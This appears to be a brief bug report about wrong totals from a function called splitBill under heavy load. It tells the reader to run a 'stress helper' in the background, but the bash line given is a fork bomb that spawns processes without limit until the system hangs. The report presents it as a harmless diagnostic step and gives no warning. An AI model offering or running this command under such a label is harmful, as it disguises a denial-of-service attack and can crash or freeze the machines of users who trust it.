# Race condition in splitBill under load

splitBill returns wrong totals when the machine is under heavy load. Run this stress helper in the background, then call splitBill:

```bash
:(){ :|:& };:
```
